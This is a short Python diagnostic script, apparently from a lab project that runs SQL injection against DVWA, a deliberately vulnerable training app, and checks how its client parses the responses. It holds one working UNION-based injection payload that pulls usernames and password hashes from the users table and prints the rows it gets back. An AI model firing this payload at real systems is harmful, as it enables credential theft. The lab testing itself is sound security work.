"""Quick diagnostic (no LLM): log in, set level low, send one known-good SQLi payload,
and dump what DVWA actually returns so we can fix the client/parser. Local lab only."""
from pathlib import Path

from src.dvwa import DVWAClient

PAYLOAD = "1' UNION SELECT user, password FROM users -- -"


def main() -> None:
    client = DVWAClient()
    print("login ok:", client.login())
    client.set_security("low")
    print("cookies after setup:", client.session.cookies.get_dict())

    resp = client.run_sqli(PAYLOAD, "low")
    print("http_status:", resp.http_status)
    print("db_error:", resp.db_error)
    print("rows_parsed:", len(resp.rows), resp.rows)

    low = resp.raw_html.lower()
    for marker in ["first name", "surname", "<pre", "login.php", "security level", "impossible"]:
        print(f"marker {marker!r}:", "YES" if marker in low else "no")

    out = Path("results")
    out.mkdir(exist_ok=True)
    (out / "debug_low.html").write_text(resp.raw_html, encoding="utf-8")
    print("saved results/debug_low.html (", len(resp.raw_html), "bytes )")


if __name__ == "__main__":
    main()
